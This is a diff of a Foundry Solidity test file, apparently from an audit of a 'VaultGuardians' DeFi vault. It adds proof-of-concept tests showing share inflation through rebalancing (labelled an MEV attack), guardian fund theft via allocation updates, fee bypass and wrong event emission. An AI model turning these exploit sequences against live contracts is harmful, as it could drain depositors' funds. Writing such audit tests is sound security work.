@@ -4,7 +4,7 @@ pragma solidity 0.8.20;
 import {Base_Test} from "../../Base.t.sol";
 import {VaultShares} from "../../../src/protocol/VaultShares.sol";
 import {IERC20} from "../../../src/protocol/VaultGuardians.sol";
-import {ERC20Mock} from "../../mocks/ERC20Mock.sol";
+import {ERC20Mock, ERC20} from "../../mocks/ERC20Mock.sol";
 import {VaultGuardiansBase} from "../../../src/protocol/VaultGuardiansBase.sol";
 
 import {VaultGuardians} from "../../../src/protocol/VaultGuardians.sol";
@@ -16,6 +16,7 @@ import {IERC20Errors} from "@openzeppelin/contracts/interfaces/draft-IERC6093.so
 import {UniswapAdapter} from "src/protocol/investableUniverseAdapters/UniswapAdapter.sol";
 import {stdError} from "forge-std/StdError.sol";
 import {Math} from "@openzeppelin/contracts/utils/math/Math.sol";
+import {IERC777Sender} from '@openzeppelin/contracts/interfaces/IERC777Sender.sol';
 
 contract VaultGuardiansBaseTest is Base_Test {
     address public guardian = makeAddr("guardian");
@@ -42,6 +43,8 @@ contract VaultGuardiansBaseTest is Base_Test {
     event DinvestedFromGuardian(address guardianAddress, IERC20 token, uint256 amount);
     event GuardianUpdatedHoldingAllocation(address guardianAddress, IERC20 token);
     event UniswapInvested(uint256 tokenAmount, uint256 wethAmount, uint256 liquidity);
+    event VaultGuardians__UpdatedStakePrice(uint256 oldStakePrice, uint256 newStakePrice);
+
 
     function setUp() public override {
         Base_Test.setUp();
@@ -499,7 +502,7 @@ contract VaultGuardiansBaseTest is Base_Test {
         console2.log("guardianShare after updating allocation: ", guardianShare); //200400000000000010.03
     }
 
-    //@audit-poc Reverting due to excess liquidity provision
+    //@report-written Reverting due to excess liquidity provision
     function testInvestmentUnableToGoThrough() external hasGuardian {
         vm.prank(guardian);
         vaultGuardians.updateHoldingAllocation(weth, newAllocationData);
@@ -508,8 +511,8 @@ contract VaultGuardiansBaseTest is Base_Test {
         //Reverting with ERC20InsufficientBalance
         wethVaultShares.rebalanceFunds();
     }
-    //@audit-poc showing discrepancy in the event emission of uniswap invest and divest
 
+    //@report-written showing discrepancy in the event emission of uniswap invest and divest
     function testDiscrepancyInEventEmission() external {
         weth.mint(mintAmount, guardian);
         uint256 amountToDeosit = stakePrice; //WETH amount
@@ -529,7 +532,7 @@ contract VaultGuardiansBaseTest is Base_Test {
         wethVaultShares.rebalanceFunds();
     }
     
-    //@audit-poc
+    //@report-written
     function testUnbackedSharesMintingCausingUnderCollateralization() external{
         AllocationData memory allocationDataNew = AllocationData(1000, 0, 0);
 
@@ -564,7 +567,7 @@ contract VaultGuardiansBaseTest is Base_Test {
         assertGt(expectedAssets, actualAssets);
     }
 
-    //@audit-poc
+    //@report-written
     function testUnfairShareDistributionToUsers() external hasGuardian{
         weth.mint(20 ether, user);
         vm.startPrank(user);
@@ -600,7 +603,7 @@ contract VaultGuardiansBaseTest is Base_Test {
         wethVaultShares.previewWithdraw(totalSharesMinted);
     }
 
-    //@audit-poc
+    //@report-written
     function testOverInvestmentOfFunds() external{
         AllocationData memory allocationDataNew = AllocationData(1000, 0, 0);
 
@@ -627,7 +630,7 @@ contract VaultGuardiansBaseTest is Base_Test {
         assertLt(actualAssetsToInvest, assetsToInvest);
     }
 
-    //@audit-poc
+    //@report-written
     function testPrecisionLossDueToSmallDeposits() external {
         AllocationData memory allocationDataNew = AllocationData(1000, 0, 0);
 
@@ -648,7 +651,7 @@ contract VaultGuardiansBaseTest is Base_Test {
         assertEq(feeShares, 0);
     }
 
-    //@audit-poc
+    //@report-written
     function testGuardianStealingByUpdatingAllocation() external hasGuardian hasTokenGuardian{
         usdc.mint(20 ether, user);
         vm.startPrank(user);
@@ -675,5 +678,74 @@ contract VaultGuardiansBaseTest is Base_Test {
         vm.stopPrank();
 
         console2.log("assetsRecovered: ", assetsRecovered); //158.31263072845481799
+    }
+
+    //@report-written
+    function testUpdateStakePriceIncorrectEmission() external {
+        // uint256 oldStakePrice = vaultGuardians.getGuardianStakePrice();
+        uint256 newStakePrice = 2450;
+        vm.prank(vaultGuardians.owner());
+        vm.expectEmit(address(vaultGuardians));
+        emit VaultGuardians__UpdatedStakePrice(newStakePrice, newStakePrice);
+        vaultGuardians.updateGuardianStakePrice(newStakePrice);
+    }
+
+    //@report-written
+    function testUpdateGuardianAndDaoCutIncorrectEmission() external {
+        uint256 newGuardianAndDAOCut = 2560;
+        vm.prank(vaultGuardians.owner());
+        vm.expectEmit(address(vaultGuardians));
+        emit VaultGuardians__UpdatedStakePrice(newGuardianAndDAOCut, newGuardianAndDAOCut);
+        vaultGuardians.updateGuardianAndDaoCut(newGuardianAndDAOCut);
+    }
+
+    //@report-written
+    function testBecomeGuardianWithoutPayingFee() external {
+        weth.mint(mintAmount, guardian);
+        vm.startPrank(guardian);
+        weth.approve(address(vaultGuardians), mintAmount);
+        address wethVault = vaultGuardians.becomeGuardian(allocationData);
+        wethVaultShares = VaultShares(wethVault);
+        vm.stopPrank();
+
+        address expectedGuardian = wethVaultShares.getGuardian();
+        assertEq(expectedGuardian, guardian);
+    }
+
+    //@audit-poc
+    function testMEVAttackWithUpdateAllocation() external hasGuardian hasTokenGuardian {
+
+        usdc.mint(20 ether, user);
+        vm.startPrank(user);
+        usdc.approve(address(usdcVaultShares), 20 ether);
+        VaultShares(usdcVaultShares).deposit(20 ether, user);
+        uint256 userShare = VaultShares(usdcVaultShares).balanceOf(user);
+        console2.log("userShare: ", userShare); //10.02
+        vm.stopPrank();
+
+        vm.prank(guardian);
+        vaultGuardians.updateHoldingAllocation(usdc, newAllocationData);
+        VaultShares(usdcVaultShares).rebalanceFunds();
+
+        usdc.mint(20 ether, user);
+        vm.startPrank(user);
+        usdc.approve(address(usdcVaultShares), 20 ether);
+        VaultShares(usdcVaultShares).deposit(20 ether, user);
+        uint256 userShareNew = VaultShares(usdcVaultShares).balanceOf(user);
+        //Without Rebalancing: 106.986879999999999982
+        //WithRebalancing: 1003603199999999999920.079999999999999995
+        console2.log("userShare: ", userShareNew);
+        vm.stopPrank();
+
+        //total shares user is capable of redeeming
+        vm.startPrank(user);
+        uint256 userMaxRedeem = VaultShares(usdcVaultShares).maxRedeem(user);
+        console2.log("userMaxRedeem: ", userMaxRedeem);
+       
+        deal(address(usdc), address(usdcVaultShares), 1000 ether);
+        //user waited till market condition becomes favourable
+        uint256 assetsReceived = usdcVaultShares.redeem(userMaxRedeem, user, user);
+        console2.log("assetsReceived: ", assetsReceived);
+        vm.stopPrank();
     }
 }
